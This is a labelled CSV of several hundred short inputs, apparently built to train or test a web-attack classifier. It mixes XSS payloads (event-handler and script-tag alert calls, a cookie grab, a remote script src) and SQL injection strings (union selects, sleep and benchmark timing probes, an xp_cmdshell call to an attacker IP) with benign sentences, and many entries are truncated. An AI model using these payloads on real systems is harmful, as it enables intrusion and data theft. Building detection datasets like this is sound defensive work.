Payload,Label,text_label,ID
"<style onmouseenter=""alert(1)"">test</style>",1,XSS,4652
Join the team for lunch.,0,normal,22557
Select send.,0,normal,24699
Merge the project teams.,0,normal,22726
<nobr onpointermove=alert(1)>XSS</nobr>,1,XSS,6003
"<button oncontextmenu=""alert(1)"">test</button>",1,XSS,7145
"</ foo=""><script>alert(91)</script>"">",1,XSS,9028
`'><script>-javascript:alert(518)</script>,1,XSS,8964
-6020'+ ( select isrz where 2489 = 2489 union all ,2,SQLi,21945
javascript:javascript:alert(1),1,XSS,9447
"1"" ) as hfgk where 1100 = 1100 or char ( 119 ) ||c",2,SQLi,20567
"1,iif ( 6333 = 1227,1,1/0 )",2,SQLi,18743
Select dislike.,0,normal,24743
"1' where 8437 = 8437 and make_set ( 8403 = 8403,88",2,SQLi,20085
"<div style=""position:absolute;top:0;left:0;width:1",1,XSS,9093
"1%"" ) union all select null,null,null,null,null,nu",2,SQLi,13416
1 and 5556 = ( select count ( * ) from all_users t,2,SQLi,13466
"<a href=""\x02javascript:javascript:alert(1)"" id=""f",1,XSS,533
"<menuitem onkeypress=""alert(1)"" contenteditable>te",1,XSS,2419
"<center oncopy=""alert(1)"" contenteditable>test</ce",1,XSS,4044
"<abbr onbeforecut=""alert(1)"" contenteditable>test<",1,XSS,4679
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2923
"-7889"" ) ) as oayf where 1765 = 1765 or 8571 = 857",2,SQLi,20662
"<bdo oncopy=""alert(1)"" contenteditable>test</bdo>",1,XSS,2251
<acronym onfocusout=alert(1) tabindex=1 id=x></acr,1,XSS,5482
1 ) where 1079 = 1079,2,SQLi,17937
"&lt;A HREF=\""http&#58;//0x42&#46;0x0000066&#46;0x7",1,XSS,1052
"{""id"":null,""name"":""Swoobat""}",0,normal,27229
Where's the festival?,0,normal,23585
"</title><script>$=1,alert($)</script>",1,XSS,9460
"ï¿½;alert(String.fromCharCode(88,83,83))//ï¿½;alert(St",1,XSS,1720
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5276
Select the perfect outfit.,0,normal,24300
"-4817 union all select 7415,7415,7415,7415,7415,74",2,SQLi,12387
"<xmp onmouseover=""alert(1)"">test</xmp>",1,XSS,2461
select ( case when ( 2394 = 4530 ) then 2394 else ,2,SQLi,13488
"<details onmouseleave=""alert(1)"">test</details>",1,XSS,6796
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10550
"<blink onmouseup=""alert(1)"">test</blink>",1,XSS,8624
and sleep 5,2,SQLi,11161
Select where it counts.,0,normal,23369
1 ) where 6950 = 6950 rlike ( select * from ( sele,2,SQLi,16915
1 ) where 6035 = 6035,2,SQLi,16414
Please select one.,0,normal,24782
1%' ) and 4595 = 4595#,2,SQLi,18018
1'+ ( select goec where 9460 = 9460 rlike ( select,2,SQLi,22123
"<TABLE><TD BACKGROUND=""javascript:javascript:alert",1,XSS,760
1 ) ) as wajy where 8593 = 8593,2,SQLi,16778
"-9496 ) ) ) or elt ( 7511 = 3951,3951 ) and ( ( ( ",2,SQLi,16826
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5490
-9076'+ ( select lqvj where 8551 = 8551 union all ,2,SQLi,13452
"<form onmouseout=""alert(1)"">test</form>",1,XSS,3341
select,0,normal,26642
AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ,2,SQLi,11203
Select your barter.,0,normal,25051
"<dir onmouseover=""alert(1)"">test</dir>",1,XSS,6063
"select * from users where id = 1 or ""1{"" or 1 = 1 ",2,SQLi,11945
"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomb",2,SQLi,20467
<select id=x tabindex=1 onactivate=alert(1)></sele,1,XSS,6624
1 ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) |,2,SQLi,14048
"<cite draggable=""true"" ondragenter=""alert(1)"">test",1,XSS,4351
Where to execute the query?,0,normal,23471
"<spacer onbeforecopy=""alert(1)"" contenteditable>te",1,XSS,7473
<code onpointerdown=alert(1)>XSS</code>,1,XSS,3694
"<em oncut=""alert(1)"" contenteditable>test</em>",1,XSS,5770
"1' ) where 8211 = 8211 union all select null,null,",2,SQLi,12693
<input type=image onloadstart=alert(1) src=validim,1,XSS,4398
"<bdi draggable=""true"" ondrag=""alert(1)"">test</bdi>",1,XSS,6208
<datalist onpointerup=alert(1)>XSS</datalist>,1,XSS,2905
"<strike onmouseup=""alert(1)"">test</strike>",1,XSS,1841
"-3721' ) union all select 9050,9050--",2,SQLi,12189
Sheep and cattle given a free choice between peren,0,normal,25556
Select your weapon.,0,normal,24825
"-8699"" ) union all select 8645,8645,8645,8645,8645",2,SQLi,20381
The hard-boiled and peeled eggs were sold in pails,0,normal,25434
<progress id=x tabindex=1 onfocus=alert(1)></progr,1,XSS,6761
"<picture draggable=""true"" ondragleave=""alert(1)"">t",1,XSS,3342
"<command draggable=""true"" ondragleave=""alert(1)"">t",1,XSS,5215
1%' ) ) ) rlike ( select * from ( select ( sleep (,2,SQLi,22053
1%' ) ) ) and 6510 = ( select count ( * ) from sys,2,SQLi,21219
1' ) ) ) or sleep ( 5 ) #,2,SQLi,16183
<body onscroll=javascript:alert(1)><br><br><br><br,1,XSS,621
"<;IMG "";"";"";>;<;SCRIPT>;alert("";XSS"";)<;/SCRIPT>;""",1,XSS,1658
<span onblur=alert(1) tabindex=1 id=x></span><inpu,1,XSS,2630
rollback,0,normal,23165
"Please, select wisely.",0,normal,24418
"1 ) or ( select 9173 from ( select count ( * ) ,co",2,SQLi,14703
1 where 5311 = 5311 rlike ( select * from ( select,2,SQLi,18423
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20d",2,SQLi,10906
"-8046"" ) ) ) union all select 3126,3126,3126,3126,",2,SQLi,22337
"<command onmouseleave=""alert(1)"">test</command>",1,XSS,2001
1'+ ( select 'asmj' where 7808 = 7808 or 2633 = db,2,SQLi,15337
-8463 ) ) ) or 4861 = 9834#,2,SQLi,21969
"<main draggable=""true"" ondragenter=""alert(1)"">test",1,XSS,3884
1 ) as ryks where 1196 = 1196,2,SQLi,17949
"{""id"":null,""firstName"":""Damien"",""lastName"":""Goh"",""",0,normal,27209
"-1503"" order by 1--",2,SQLi,22346
1'+ ( select dklj where 3265 = 3265,2,SQLi,18626
<plaintext onfocusout=alert(1) tabindex=1 id=x></p,1,XSS,4218
"iif ( 5462 = 8866,1,1/0 )",2,SQLi,13476
1 ) where 7729 = 7729,2,SQLi,14790
"( select * from generate_series ( 4990,4990,case w",2,SQLi,13464
Let him select a route for you and then suggest an,0,normal,25910
"1"" ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ",2,SQLi,15758
admin' or 1 = 1/*,2,SQLi,11517
"<dfn onpaste=""alert(1)"" contenteditable>test</dfn>",1,XSS,7227
ï¿½><sï¿½%2bï¿½cript>alert(document.cookie)</script>,1,XSS,1725
"<td onpaste=""alert(1)"" contenteditable>test</td>",1,XSS,5750
"<noscript onmousemove=""alert(1)"">test</noscript>",1,XSS,6107
Select change.,0,normal,24610
"<strong onkeyup=""alert(1)"" contenteditable>test</s",1,XSS,8817
"<tbody onmousedown=""alert(1)"">test</tbody>",1,XSS,2409
Lulu & Georgia: Up to 70% off select items in semi,0,normal,25902
"<base onclick=""alert(1)"">test</base>",1,XSS,3468
"1 ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171",2,SQLi,15513
1' ) and 8514 = ( select count ( * ) from domain.d,2,SQLi,16395
""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay",2,SQLi,10900
or pg_sleep(5)--,2,SQLi,10366
"{""id"":null,""firstName"":""Willie"",""lastName"":""Lam"",""",0,normal,27247
1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ,2,SQLi,19140
"<XSS STYLE=""behavior: url(%(htc)s);"">",1,XSS,755
Thus it is possible to select a comparator from a ,0,normal,25291
<script>/* *\x00/javascript:alert(1)// */</script>,1,XSS,444
1 ) where 5048 = 5048 or char ( 119 ) ||char ( 100,2,SQLi,16595
1 ) where 6424 = 6424,2,SQLi,18735
"\\"";alert('XSS');//",1,XSS,973
"<body onPropertyChange body onPropertyChange=""java",1,XSS,377
select * from users where id = 1 union select @<@$,2,SQLi,11655
-4324 order by 1--,2,SQLi,18710
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SC",1,XSS,826
"<div style=""list-style:url(http://foo.f)\20url(jav",1,XSS,705
"1%"" ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",2,SQLi,19931
"-1816"" ) or 1570 = convert ( int, ( select char ( ",2,SQLi,22040
1' ) where 7629 = 7629 rlike ( select * from ( sel,2,SQLi,12207
"<th onmousemove=""alert(1)"">test</th>",1,XSS,2657
"Thus Mr Papillon considered that, while the teachi",0,normal,25290
1' ) or 1022 = ( select count ( * ) from all_users,2,SQLi,13145
"1"" ) where 8953 = 8953 or 5356 = ( select count ( ",2,SQLi,17375
<button onControlSelect=javascript:alert(1)>,1,XSS,9595
1%' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) |,2,SQLi,18002
-8504 where 3086 = 3086 or 1131 = 9188#,2,SQLi,14033
1'|| ( select 'ycya' from dual where 3536 = 3536 a,2,SQLi,20013
"<IMG DYNSRC=\""javascript:alert('XSS')\"">",1,XSS,1293
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10532
I'll select wine.,0,normal,24783
"<label draggable=""true"" ondragenter=""alert(1)"">tes",1,XSS,3445
-4108' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 11,2,SQLi,14168
"1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x717",2,SQLi,17555
"<i onclick=""alert(1)"">test</i>",1,XSS,6823
Select replace.,0,normal,24759
"1 and make_set ( 6911 = 1867,1867 )",2,SQLi,19830
1' ) or 8156 = ( select count ( * ) from generate_,2,SQLi,19932
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,2339
<nextid onpointerover=alert(1)>XSS</nextid>,1,XSS,8641
<audio id=x tabindex=1 onactivate=alert(1)></audio,1,XSS,4875
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,3068
<style>:target {color:red;}</style><strike id=x st,1,XSS,7985
Determine values where valid.,0,normal,23313
-1385' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5,2,SQLi,18936
1' ) or 7552 = ( select count ( * ) from rdb$field,2,SQLi,13816
"1"" ) as kbjt where 2012 = 2012 and ( 5978 = 6898 )",2,SQLi,12996
"<abbr onpaste=""alert(1)"" contenteditable>test</abb",1,XSS,3912
-1277' ) ) ) order by 1--,2,SQLi,12777
-5062 ) where 7457 = 7457 or 4144 = ( select upper,2,SQLi,20159
<style>:target {color: red;}</style><li id=x style,1,XSS,2641
1 where 7906 = 7906 or 8156 = ( select count ( * ),2,SQLi,18872
<div style=content:url(%(svg)s)></div>,1,XSS,704
"1"" or 4240 = ( select 4240 from pg_sleep ( 5 ) ) -",2,SQLi,15322
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,5175
<footer id=x tabindex=1 onactivate=alert(1)></foot,1,XSS,1936
"-3667%' ) ) union all select 3560,3560,3560--",2,SQLi,18778
"-5125 union all select 5720,5720,5720,5720,5720,57",2,SQLi,13925
"<source onmouseout=""alert(1)"">test</source>",1,XSS,4697
"1"" or exp ( ~ ( select * from ( select concat ( 0x",2,SQLi,15722
"<style>@keyframes x{}</style><meta style=""animatio",1,XSS,7744
"<template onmousedown=""alert(1)"">test</template>",1,XSS,5529
Insert the disc.,0,normal,22842
<style id=x tabindex=1 onbeforeactivate=alert(1)><,1,XSS,8034
1' and 6537 = dbms_pipe.receive_message ( chr ( 76,2,SQLi,14228
"<meta onmousedown=""alert(1)"">test</meta>",1,XSS,2806
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,8275
1,0,normal,26686
Carefully select the menu.,0,normal,24339
I picked some fresh herbs from the backyard.,0,normal,23816
<svg><aside onload=alert(1)></aside>,1,XSS,8656
"<style>@keyframes x{}</style><sub style=""animation",1,XSS,4664
"<footer draggable=""true"" ondragenter=""alert(1)"">te",1,XSS,8948
AND 1=utl_inaddr.get_host_address((SELECT DISTINCT,2,SQLi,11117
"<link onmousemove=""alert(1)"">test</link>",1,XSS,3769
"1"" ) as dien where 4022 = 4022",2,SQLi,17887
"1"" ) ) as fmul where 7827 = 7827",2,SQLi,21616
1' ) ) as pdcl where 6964 = 6964,2,SQLi,18015
"echo('IPT>alert("""")</SCRIPT>')",1,XSS,4132
"&lt;A HREF=\""http&#58;//1113982867/\""&gt;XSS&lt;/A",1,XSS,1051
"1"" where 1982 = 1982",2,SQLi,16953
"<video onclick=""alert(1)"">test</video>",1,XSS,8670
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,20247
1'|| ( select 'eils' where 8308 = 8308 or 8514 = b,2,SQLi,21992
1' ) or 9643 = ( select count ( * ) from domain.do,2,SQLi,13340
"{""id"":null,""firstName"":""Nanny"",""lastName"":""Julie"",",0,normal,27534
"1' ) and make_set ( 8403 = 8403,8899 )",2,SQLi,21968
"-3955%' ) ) union all select 7999,7999,7999,7999,7",2,SQLi,12555
"<iframe srcdoc=""&lt;img src=1 onerror=alert(1)&gt;",1,XSS,172
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,18963
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,13588
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA",1,XSS,790
"-4381 or make_set ( 6118 = 3095,3095 ) # lkcr",2,SQLi,20481
I'm planning to pick up some supplies.,0,normal,23867
"-9156' ) ) union all select 9110,9110,9110,9110#",2,SQLi,14050
"union (select NULL, NULL, NULL, (select @@version)",2,SQLi,10051
"<object onmouseup=""alert(1)"">test</object>",1,XSS,4620
"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ",2,SQLi,19712
<body/onload=&lt;!--&gt;&#10alert(1)>,1,XSS,909
1 ) as otsb where 8380 = 8380 or 7427 = dbms_pipe.,2,SQLi,17987
insert,0,normal,23106
<body onpointermove=alert(1)>XSS</body>,1,XSS,2295
Tickets go on sale for select shows on April 83.,0,normal,25286
exec master..xp_cmdshell 'ping+<attackerip>',2,SQLi,10036
"-9572%"" ) or 1570 = convert ( int, ( select char (",2,SQLi,15087
"<!--#exec cmd=""/bin/echo '<SCR'""-->",1,XSS,7276
"<tfoot ondblclick=""alert(1)"">test</tfoot>",1,XSS,5654
"1%"" ) ) and 8189 = ( select count ( * ) from sysib",2,SQLi,17974
1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||,2,SQLi,14091
1' ) as pudv where 2609 = 2609,2,SQLi,14869
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://",1,XSS,758
-9841 where 4612 = 4612 union all select 4612--,2,SQLi,16912
"<content onmouseout=""alert(1)"">test</content>",1,XSS,4124
"1%"" ) ) ) and 8312 = dbms_pipe.receive_message ( c",2,SQLi,20773
\u{61}lert(1),1,XSS,9396
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,13001
1 where 8180 = 8180 or sleep ( 5 ) #,2,SQLi,15103
"<textarea onmouseenter=""alert(1)"">test</textarea>",1,XSS,8306
"When in a store buying fabric, select your fabric ",0,normal,25157
<ruby onfocusout=alert(1) tabindex=1 id=x></ruby><,1,XSS,7232
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTY",1,XSS,1703
<optgroup onpointermove=alert(1)>XSS</optgroup>,1,XSS,5882
As they're offering up to 43% off select Delsey Pa,0,normal,26347
"1 ) where 2678 = 2678 union all select null,null,n",2,SQLi,15076
"<xss oncontextmenu=""alert(1)"" style=display:block>",1,XSS,57
<script language='javascript' src='%(jscript)s'></,1,XSS,731
"1' ) ) and updatexml ( 3393,concat ( 0x2e,0x717170",2,SQLi,18254
"&lt;IMG LOWSRC=\""javascript&#058;alert('XSS')\""&gt",1,XSS,979
-4325 order by 1--,2,SQLi,20618
Select a scenic spot.,0,normal,22724
-2761 or 1144 = 7657-- mfml,2,SQLi,13401
"<FRAMESET><FRAME SRC=""javascript:document.vulnerab",1,XSS,1501
"<base onmousedown=""alert(1)"">test</base>",1,XSS,7733
<div onpointerdown=alert(1)>XSS</div>,1,XSS,7573
<q onpointerleave=alert(1)>XSS</q>,1,XSS,6197
Update the shopping list.,0,normal,22545
1' ) ) ) and ( select 2* ( if ( ( select * from ( ,2,SQLi,14745
select * from users where id = 1 or $<\. or 1 = 1 ,2,SQLi,11749
"<bdi onbeforepaste=""alert(1)"" contenteditable>test",1,XSS,8304
"1"" ) union all select null,null--",2,SQLi,17354
<br id=x tabindex=1 ondeactivate=alert(1)></br><in,1,XSS,4963
1' ) ) or 7417 = ( select count ( * ) from sysibm.,2,SQLi,13832
1 ( select ( case when ( 4587 = 4587 ) then regexp,2,SQLi,21501
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>,1,XSS,1479
"{""id"":null,""name"":""note""}",0,normal,26781
"1' ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",2,SQLi,12272
"<header onbeforepaste=""alert(1)"" contenteditable>t",1,XSS,4367
"When you've finished, select ""Done"" and press X, o",0,normal,25139
But then it was time to select a foreign leader.,0,normal,26303
"union ( select NULL, NULL, NULL, NULL, ( select @@",2,SQLi,11861
"1%"" or 7417 = ( select count ( * ) from sysibm.sys",2,SQLi,16311
"1"" ) ) as swwb where 4244 = 4244",2,SQLi,21373
"-8410"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr (",2,SQLi,13008
1 or exp ( ~ ( select * from ( select concat ( 0x7,2,SQLi,17245
"<style>@keyframes x{}</style><optgroup style=""anim",1,XSS,5736
"1 where 6965 = 6965 and elt ( 3933 = 1232,1232 ) -",2,SQLi,20688
"-3747"" ) union all select 8962,8962,8962,8962,8962",2,SQLi,21756
select * from users where id = 1. or 1 = 1 -- 1,2,SQLi,11581
"1 and elt ( 2770 = 3669,3669 ) # sfls",2,SQLi,15307
<command onpointermove=alert(1)>XSS</command>,1,XSS,7702
Select your favorite book.,0,normal,22658
1 ) where 1527 = 1527 or 4240 = ( select 4240 from,2,SQLi,19930
<br onpointerdown=alert(1)>XSS</br>,1,XSS,6642
"1 ) or elt ( 6272 = 6272,sleep ( 5 ) )",2,SQLi,15379
"<button oncut=""alert(1)"" contenteditable>test</but",1,XSS,3656
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) an",2,SQLi,12836
"{""id"":null,""name"":""gradually""}",0,normal,26860
"1, ( select ( case when ( 5141 = 5141 ) then ( asc",2,SQLi,21923
"<iframe onbeforepaste=""alert(1)"" contenteditable>t",1,XSS,2418
"1"" ) as hfvz where 7186 = 7186 union all select nu",2,SQLi,14399
"{""id"":null,""name"":""chemical""}",0,normal,27245
"<;STYLE type="";text/css"";>;BODY{background:url("";j",1,XSS,1616
1' ) ) and 8635 = ( select count ( * ) from genera,2,SQLi,19134
1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ),2,SQLi,13794
"<script>$=1,alert($)</script>",1,XSS,9276
"1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694",2,SQLi,12687
`'><script>\xE2\x80\x85javascript:alert(509)</scri,1,XSS,8979
You first select the person you want to text from ,0,normal,25072
1 ) ) as rpwt where 4103 = 4103 and 3580 = ( selec,2,SQLi,14167
Where's the church?,0,normal,23532
The SPDR Materials Select Sector lost 7.8 percent ,0,normal,25372
"<plaintext draggable=""true"" ondragstart=""alert(1)""",1,XSS,2368
1'|| ( select 'ptkj' from dual where 6263 = 6263 u,2,SQLi,16733
"1"" ) where 5129 = 5129 order by 1--",2,SQLi,14238
"{""id"":null,""name"":""Kuramon""}",0,normal,27412
<x ondrag=alert(1)>drag this!,1,XSS,9350
"1"" ) as jiiq where 6847 = 6847",2,SQLi,13823
1%',2,SQLi,21727
"<div onpaste=""alert(1)"" contenteditable>test</div>",1,XSS,4789
"<style>@keyframes x{}</style><span style=""animatio",1,XSS,3999
"<html onclick=""alert(1)"">test</html>",1,XSS,7077
"1"" ) where 4172 = 4172 or ( select * from ( select",2,SQLi,20849
"<frameset onmouseenter=""alert(1)"">test</frameset>",1,XSS,7543
"1"" ) ) ) and 4595 = 4595#",2,SQLi,13108
"<shadow onmouseup=""alert(1)"">test</shadow>",1,XSS,3682
Select a travel destination for a vacation.,0,normal,24122
1'|| ( select 'oxam' from dual where 7162 = 7162 a,2,SQLi,21388
"-6097%' ) ) union all select 3990,3990,3990,3990,3",2,SQLi,17769
-6449' ) ) or 2590 = 2848,2,SQLi,15868
1 ) ) and 6414 = ( select count ( * ) from rdb$fie,2,SQLi,16702
-9429' ) order by 1--,2,SQLi,18538
1%' ) and char ( 120 ) ||char ( 106 ) ||char ( 117,2,SQLi,19188
-7041' ) where 6307 = 6307 or 5903 = ( 'qqpjq'|| (,2,SQLi,22280
"1"" ) ) ) and ( select * from ( select ( sleep ( 5 ",2,SQLi,21746
"-7876%' ) union all select 3909,3909,3909,3909,390",2,SQLi,16589
1 where 2238 = 2238,2,SQLi,21365
"<b onclick=""alert(1)"">test</b>",1,XSS,8411
Select your flavor.,0,normal,24803
"<source onpaste=""alert(1)"" contenteditable>test</s",1,XSS,4973
Select a coffee shop to visit.,0,normal,24171
<base id=x tabindex=1 onactivate=alert(1)></base>,1,XSS,5534
"1' ) ) union all select null,null,null--",2,SQLi,18633
"?url=javascript:alert(1)"",",1,XSS,9865
<script>var script = document.getElementsByTagName,1,XSS,9295
"<style>@keyframes slidein {}</style><link style=""a",1,XSS,6104
"<img ondblclick=""alert(1)"">test</img>",1,XSS,6398
1 or 7552 = ( select count ( * ) from rdb$fields a,2,SQLi,12902
"<style>@keyframes x{}</style><img style=""animation",1,XSS,6638
"<ins oncontextmenu=""alert(1)"">test</ins>",1,XSS,5611
""" or """"^""",2,SQLi,11555
Select the perfect honeymoon destination.,0,normal,24394
-7078'|| ( select 'lcza' where 5076 = 5076 union a,2,SQLi,16335
<summary onpointermove=alert(1)>XSS</summary>,1,XSS,8096
"-1755%' union all select 2615,2615,2615,2615,2615,",2,SQLi,15160
"{""id"":null,""firstName"":""Jacob"",""lastName"":""Ong"",""a",0,normal,26894
"<del onkeydown=""alert(1)"" contenteditable>test</de",1,XSS,4881
<basefont id=x tabindex=1 onbeforedeactivate=alert,1,XSS,3807
<plaintext id=x tabindex=1 onfocusin=alert(1)></pl,1,XSS,8774
else,0,normal,23147
"<element ondblclick=""alert(1)"">test</element>",1,XSS,6489
Where's the best place to relax and unwind?,0,normal,23938
if ( 6624 = 4232 ) select 6624 else drop function ,2,SQLi,19257
select ( case when ( 9986 = 8342 ) then 9986 else ,2,SQLi,19590
"<rb onmouseenter=""alert(1)"">test</rb>",1,XSS,7666
"{""id"":null,""firstName"":""Gunaraj"",""lastName"":""Sundr",0,normal,27022
1' in boolean mode ) order by 1#,2,SQLi,15499
1' or 8315 = ( select count ( * ) from sysibm.syst,2,SQLi,13271
Select a facial mask for skincare.,0,normal,24170
1' in boolean mode ) and 3580 = ( select count ( *,2,SQLi,21390
in,0,normal,23138
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10492
Select pick.,0,normal,24562
1' ) ) rlike ( select ( case when ( 7689 = 7689 ) ,2,SQLi,21232
"<nav draggable=""true"" ondragleave=""alert(1)"">test<",1,XSS,7549
"1' ) ) ) and elt ( 2506 = 2383,2383 ) and ( ( ( 'b",2,SQLi,17791
"<fieldset onmousedown=""alert(1)"">test</fieldset>",1,XSS,7697
><img src=1 onerror=alert(1)>.gif,1,XSS,8958
"First, download the YouTube Gaming app from the Pl",0,normal,26191
"1%' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555",2,SQLi,18727
"1"" ) where 3445 = 3445 and elt ( 1212 = 1254,1254 ",2,SQLi,16988
"1"" where 3484 = 3484 and char ( 107 ) ||char ( 121",2,SQLi,15028
-1036' ) or 6872 = 6872 and ( 'wvbi' = 'wvbi,2,SQLi,12738
<br id=x tabindex=1 onbeforedeactivate=alert(1)></,1,XSS,8839
1 ) ) as rbae where 2049 = 2049 or 6979 = like ( ',2,SQLi,18441
"-2434' ) ) ) union all select 5509,5509,5509,5509,",2,SQLi,16660
Select evolve.,0,normal,24775
"-2500' ) ) ) union all select 6853,6853,6853,6853-",2,SQLi,21598
"select count ( * ) from all_users t1,all_users t2,",2,SQLi,20910
<sup id=x tabindex=1 onfocus=alert(1)></sup>,1,XSS,2342
top['al\x65rt'](1),1,XSS,9384
"<s draggable=""true"" ondrag=""alert(1)"">test</s>",1,XSS,2915
"You can select photos from ""All Photos,"" or select",0,normal,25078
Where's the best place to watch the stars?,0,normal,23820
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,7007
"iif ( 9134 = 5736,1,1/0 )",2,SQLi,22222
"-6770' ) ) union all select 1845,1845,1845,1845,18",2,SQLi,19679
"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706",2,SQLi,17345
<map onpointerenter=alert(1)>XSS</map>,1,XSS,6230
"-5218 ) union all select 9677,9677#",2,SQLi,14844
select * from users where id = '1' union select $ ,2,SQLi,11791
"UNION SELECT @@VERSION,SLEEP(5),3",2,SQLi,10593
select sleep ( 5 ) -- waln,2,SQLi,14471
Order a cheesy pizza.,0,normal,22657
\u0061lert(1),1,XSS,9397
-8636' ) ) ) or 4301 = 7212--,2,SQLi,21048
"1"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( ",2,SQLi,13487
"<hgroup onmouseover=""alert(1)"">test</hgroup>",1,XSS,7210
1%' ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( ,2,SQLi,20214
Select consumer staple ETFs such as the Vanguard C,0,normal,25635
"<nobr onmouseleave=""alert(1)"">test</nobr>",1,XSS,2479
"<sup ondblclick=""alert(1)"">test</sup>",1,XSS,8677
1' where 6135 = 6135,2,SQLi,17092
1 ) as bpap where 7758 = 7758 or 4240 = ( select 4,2,SQLi,20684
Can you help me decide where to invest?,0,normal,23756
"<embed oncontextmenu=""alert(1)"">test</embed>",1,XSS,4561
"-3378%"" ) ) union all select 9357,9357,9357,9357,9",2,SQLi,19605
"-9566%"" ) union all select 7973,7973,7973,7973--",2,SQLi,14884
"<s onmouseenter=""alert(1)"">test</s>",1,XSS,7907
1' where 3900 = 3900 and 3715 in ( ( char ( 113 ) ,2,SQLi,13930
Group data where valid.,0,normal,23304
"{""id"":null,""firstName"":""Arun"",""lastName"":""Kumar"",""",0,normal,27614
-7561 ) as ilrm where 8828 = 8828 or 5903 = ( 'qqp,2,SQLi,18793
She'll select her jewelry.,0,normal,24331
1 ) or 4915 = ( select count ( * ) from domain.dom,2,SQLi,16829
As the brushes are slowly shifted over on the revo,0,normal,26348
1 ) waitfor delay '0:0:5' and ( 2993 = 2993,2,SQLi,13620
"<menu onmouseover=""alert(1)"">test</menu>",1,XSS,7042
<style>:target {color: red;}</style><dialog id=x s,1,XSS,6440
1 and 4386 = utl_inaddr.get_host_address ( chr ( 1,2,SQLi,12865
"<style>@keyframes x{}</style><nextid style=""animat",1,XSS,6024
select * from users where id = 1 <1## union select,2,SQLi,11492
"<svg onload=""javascript:alert(123)"" xmlns=""#""></sv",1,XSS,1128
"<th draggable=""true"" ondrag=""alert(1)"">test</th>",1,XSS,3942
<dd onpointermove=alert(1)>XSS</dd>,1,XSS,7311
"{""id"":null,""firstName"":""Ng"",""lastName"":""Beng Tee"",",0,normal,27084
<object id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,6637
Where's the opera?,0,normal,23582
"-2296"" union all select 7359,7359,7359,7359,7359,7",2,SQLi,20856
